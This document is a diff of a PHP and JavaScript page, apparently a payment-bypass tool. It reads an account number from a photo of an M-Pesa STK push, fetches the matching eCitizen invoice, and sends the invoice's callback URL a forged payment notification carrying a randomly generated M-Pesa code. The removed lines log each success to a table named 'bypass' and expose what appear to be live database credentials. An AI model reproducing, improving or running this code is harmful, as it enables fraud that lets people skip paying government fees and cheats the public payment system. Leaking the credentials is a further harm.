@@ -1,16 +1,5 @@
 <?php
-// Replace with your own credentials!
-$dbhost = "srv1140.hstgr.io";
-$dbname = "u854855859_redHat";
-$dbuser = "u854855859_redHat";
-$dbpass = "ccu*4HhD4^Cm";
-$pdo = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass, [
-    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
-]);
-
-function generateMpesaCode()
-{
+function generateMpesaCode() {
     $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
     $alphabet2 = '1234567890';
@@ -27,11 +16,10 @@ function generateMpesaCode()
     return $code;
 }
 
+// AJAX backend
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
     header('Content-Type: application/json');
-    $action = $_POST['ajax_action'];
-
-    if ($action === 'fetch_invoice') {
+    if ($_POST['ajax_action'] === 'fetch_invoice') {
         $code = trim($_POST['code']);
         $fetch_url = "https://payments.ecitizen.go.ke/api/invoice/checkout/{$code}?callback_url=https://bomayangu.go.ke/payments";
         $invoice_html = @file_get_contents($fetch_url);
@@ -108,13 +96,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
             exit;
         }
     }
-    if ($action === 'send_notification') {
+    if ($_POST['ajax_action'] === 'send_notification') {
         $notification_url = $_POST['notification_url'];
         $amount = $_POST['amount'];
         $bill_ref = $_POST['bill_ref'];
         $invoice_no = $_POST['invoice_no'];
         $msisdn = $_POST['msisdn'];
-        $client = $_POST['client'];
         $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
         $payment_date_iso = $now->format(DateTime::ATOM);
         $payment_date_custom = $now->format("Y-m-d H:i:sP T e");
@@ -149,16 +136,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
         $response = curl_exec($ch);
         $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-        if ($http_status === 200 || $http_status === 201) {
-            $stmt = $pdo->prepare('INSERT INTO bypass (invoice_no, amount, client, ref, route, extdoc) VALUES (?, ?, ?, ?, ?, ?)');
-            $stmt->execute([$invoice_no, $amount, $client, $notification_url, $notification_url, $bill_ref]);
-            $dt1 = "Data inserted successfully recorded.";
-        } else {
-            $dt1 = "Insertion Not Done!";
-        }
         echo json_encode([
             'status' => ($http_status === 200 || $http_status === 201) ? 'success' : 'error',
-            'message' => $response . '<br/>' . $dt1 . '<br/> Status Code: ' . $http_status . '<br/><br/>' . json_encode($payload, JSON_PRETTY_PRINT)
+            'message' => $response . '<br/> Status Code: ' . $http_status . '<br/><br/>' . json_encode($payload, JSON_PRETTY_PRINT)
         ]);
         exit;
     }
@@ -168,143 +148,109 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>MMKA Fast STK Processor</title>
+    <title>Fast STK Scan App</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4.0.2/dist/tesseract.min.js"></script>
+    <style>
+        body { background: #181818; color: #fff; }
+        #result { min-height: 60px; }
+        .form-label, .form-control, .form-select, .alert { color: #181818 !important; }
+    </style>
 </head>
-<body class="bg-light">
-    <div class="container py-5">
-        <h3 class="mb-3 text-center">MMKA Fast STK Processor</h3>
-        <button id="scanBtn" class="btn btn-warning mb-3 w-100">Scan STK Push (Camera)</button>
-        <input type="file" accept="image/*" capture="environment" id="stkCapture" style="display:none;">
-        <form id="fetchForm" class="mb-4">
-            <div class="input-group">
-                <input type="text" class="form-control" name="code" placeholder="Account Number (auto-filled)" required>
-                <button type="submit" class="btn btn-primary">Fetch Invoice</button>
-            </div>
-        </form>
-        <form id="notifyForm" class="mt-4 d-none">
-            <h5 class="mb-3">Payment Notification Details</h5>
-            <div class="row">
-                <div class="col-md-6">
-                    <div class="mb-2"><label class="form-label">Notification URL</label><input type="text" class="form-control" name="notification_url" readonly></div>
-                    <div class="mb-2"><label class="form-label">Amount</label><input type="text" class="form-control" name="amount" readonly></div>
-                    <div class="mb-2"><label class="form-label">Bill Reference</label><input type="text" class="form-control" name="bill_ref" readonly></div>
-                    <div class="mb-2"><label class="form-label">Invoice Number</label><input type="text" class="form-control" name="invoice_no" readonly></div>
-                </div>
-                <div class="col-md-6">
-                    <div class="mb-2"><label class="form-label">Date ISO</label><input type="text" class="form-control" name="date_iso" readonly></div>
-                    <div class="mb-2"><label class="form-label">Date Custom</label><input type="text" class="form-control" name="date_custom" readonly></div>
-                    <div class="mb-2"><label class="form-label">MSISDN</label><input type="text" class="form-control" name="msisdn" readonly></div>
-                    <div class="mb-2">
-                        <label class="form-label">Use Client</label>
-                        <select class="form-select" name="client">
-                            <?php
-                            $stmt = $pdo->query('SELECT * FROM clients ORDER BY name ASC');
-                            foreach ($stmt as $rows) {
-                                echo '<option value="' . $rows['name'] . '">' . $rows['name'] . '</option>';
-                            }
-                            ?>
-                        </select>
-                    </div>
-                </div>
-            </div>
-            <button type="submit" class="btn btn-success w-100">Submit Notification</button>
-        </form>
-        <div class="mt-3" id="result"></div>
-        <!-- Loader Modal -->
-        <div class="modal fade" id="loaderModal" tabindex="-1" aria-hidden="true" style="background:rgba(255,255,255,0.7)">
-            <div class="modal-dialog modal-dialog-centered">
-                <div class="modal-content bg-transparent border-0 shadow-none">
-                    <div class="modal-body text-center">
-                        <div class="spinner-border text-primary" style="width: 4rem; height: 4rem;" role="status">
-                            <span class="visually-hidden">Loading...</span>
-                        </div>
-                        <div class="mt-3 text-primary fw-bold">Processing...</div>
-                    </div>
-                </div>
-            </div>
+<body>
+<div class="container py-4">
+    <h4 class="mb-3 text-center">STK Push Fast Processor</h4>
+    <button id="scanBtn" class="btn btn-warning mb-3 w-100">Scan STK Push (Camera)</button>
+    <input type="file" accept="image/*" capture="environment" id="stkCapture" style="display:none;">
+    <form id="fetchForm" class="mb-3">
+        <div class="input-group">
+            <input type="text" class="form-control" name="code" placeholder="Account No (auto)" required>
+            <button type="submit" class="btn btn-primary">Fetch Invoice</button>
         </div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script>
-        // Loader modal instance
-        const loaderModal = new bootstrap.Modal(document.getElementById('loaderModal'), { backdrop: 'static', keyboard: false });
-        function showLoader() { loaderModal.show(); }
-        function hideLoader() { loaderModal.hide(); }
+    </form>
+    <form id="notifyForm" class="mt-3 d-none">
+        <div class="row">
+            <div class="col-12 col-md-6 mb-2"><input type="text" class="form-control" name="notification_url" placeholder="Notification URL" readonly></div>
+            <div class="col-6 mb-2"><input type="text" class="form-control" name="amount" placeholder="Amount" readonly></div>
+            <div class="col-6 mb-2"><input type="text" class="form-control" name="bill_ref" placeholder="Bill Ref" readonly></div>
+            <div class="col-6 mb-2"><input type="text" class="form-control" name="invoice_no" placeholder="Invoice No" readonly></div>
+            <div class="col-6 mb-2"><input type="text" class="form-control" name="msisdn" placeholder="MSISDN" readonly></div>
+        </div>
+        <button type="submit" class="btn btn-success w-100">Submit Notification</button>
+    </form>
+    <div class="mt-3" id="result"></div>
+</div>
+<script>
+let t0, t1;
 
-        let t0, t1;
+// Camera scan handler
+$('#scanBtn').on('click', function() { $('#stkCapture').click(); });
 
-        $('#scanBtn').on('click', function() { $('#stkCapture').click(); });
+// On image selected
+$('#stkCapture').on('change', function(e) {
+    if (!e.target.files.length) return;
+    let file = e.target.files[0];
+    t0 = performance.now();
+    $('#result').html('<div class="alert alert-info">Running OCR…</div>');
+    Tesseract.recognize(
+        file,
+        'eng',
+        { logger: m => console.log(m) }
+    ).then(({ data: { text } }) => {
+        // Try multiple patterns for the account no.
+        let match = text.match(/Account\s*no\.?\s*([A-Z0-9]+)/i)
+            || text.match(/to\s+[a-zA-Z\-\s]+no\.?\s*([A-Z0-9]{8,10})/i)
+            || text.match(/\b([A-Z0-9]{8,10})\b/); // fallback
+        if (match) {
+            let code = match[1].trim();
+            $('input[name="code"]').val(code);
+            $('#fetchForm').trigger('submit');
+        } else {
+            $('#result').html('<div class="alert alert-danger">Account no not detected. Try retaking or crop image.</div>');
+        }
+    }).catch(function(err) {
+        $('#result').html('<div class="alert alert-danger">OCR failed: ' + err + '</div>');
+    });
+});
 
-        $('#stkCapture').on('change', function(e) {
-            if (!e.target.files.length) return;
-            let file = e.target.files[0];
-            t0 = performance.now();
-            showLoader();
-            Tesseract.recognize(
-                file,
-                'eng',
-                { logger: m => console.log(m) }
-            ).then(({ data: { text } }) => {
-                // Try to extract account number with various possible patterns
-                let match = text.match(/Account\s*no\.?\s*([A-Z0-9]+)/i)
-                    || text.match(/no\.?\s*([A-Z0-9]{8,10})/i)
-                    || text.match(/([A-Z0-9]{8,10})/); // fallback to first all-caps sequence
-                if (match) {
-                    let code = match[1].trim();
-                    $('input[name="code"]').val(code);
-                    $('#fetchForm').trigger('submit');
-                } else {
-                    $('#result').html('<div class="alert alert-danger">Failed to detect account number. Please crop image or try again.</div>');
-                    hideLoader();
-                }
-            }).catch(function(err) {
-                $('#result').html('<div class="alert alert-danger">OCR failed: ' + err + '</div>');
-                hideLoader();
+// Invoice fetch
+$('#fetchForm').on('submit', function(e) {
+    e.preventDefault();
+    $('#result').html('<div class="alert alert-info">Fetching invoice…</div>');
+    const code = $(this).find('input[name="code"]').val();
+    $.post('', { ajax_action: 'fetch_invoice', code }, function(res) {
+        if (res.status === 'success') {
+            Object.entries(res.data).forEach(([k, v]) => {
+                $('#notifyForm').find(`[name="${k}"]`).val(v);
             });
-        });
+            $('#notifyForm').removeClass('d-none');
+            $('#result').html('<div class="alert alert-success">Invoice loaded. Submitting notification…</div>');
+            setTimeout(() => { $('#notifyForm').trigger('submit'); }, 200); // auto-submit
+        } else {
+            $('#result').html(`<div class="alert alert-danger">${res.message}</div>`);
+            $('#notifyForm').addClass('d-none');
+        }
+    }, 'json');
+});
 
-        $('#fetchForm').on('submit', function(e) {
-            e.preventDefault();
-            showLoader();
-            const code = $(this).find('input[name="code"]').val();
-            $.post('', { ajax_action: 'fetch_invoice', code }, function(res) {
-                if (res.status === 'success') {
-                    Object.entries(res.data).forEach(([k, v]) => {
-                        $('#notifyForm').find(`[name="${k}"]`).val(v);
-                    });
-                    $('#notifyForm').removeClass('d-none');
-                    $('#result').html('<div class="alert alert-success">Invoice loaded. Submitting notification…</div>');
-                    // Immediately submit notification
-                    setTimeout(() => { $('#notifyForm').trigger('submit'); }, 300);
-                } else {
-                    $('#result').html(`<div class="alert alert-danger">${res.message}</div>`);
-                    $('#notifyForm').addClass('d-none');
-                    hideLoader();
-                }
-            }, 'json');
-        });
-
-        $('#notifyForm').on('submit', function(e) {
-            e.preventDefault();
-            const formData = $(this).serializeArray();
-            const data = { ajax_action: 'send_notification' };
-            formData.forEach(item => data[item.name] = item.value);
-            $.post('', data, function(res) {
-                t1 = performance.now();
-                let elapsed = ((t1 - t0) / 1000).toFixed(3);
-                $('#result').html(`<div class="alert alert-${res.status === 'success' ? 'success' : 'danger'}">
-                    <b>API Response:</b><br>${res.message}<br>
-                    <b>Elapsed time from scan to result: ${elapsed}s</b>
-                </div>`);
-                hideLoader();
-            }, 'json');
-        });
-
-        $(document).ajaxStop(function() { hideLoader(); });
-    </script>
+// Notification send
+$('#notifyForm').on('submit', function(e) {
+    e.preventDefault();
+    $('#result').html('<div class="alert alert-info">Sending notification…</div>');
+    const formData = $(this).serializeArray();
+    const data = { ajax_action: 'send_notification' };
+    formData.forEach(item => data[item.name] = item.value);
+    $.post('', data, function(res) {
+        t1 = performance.now();
+        let elapsed = ((t1 - t0) / 1000).toFixed(3);
+        $('#result').html(`<div class="alert alert-${res.status === 'success' ? 'success' : 'danger'}">
+            <b>API Response:</b><br>${res.message}<br>
+            <b>Elapsed time: ${elapsed}s</b>
+        </div>`);
+    }, 'json');
+});
+</script>
 </body>
 </html>
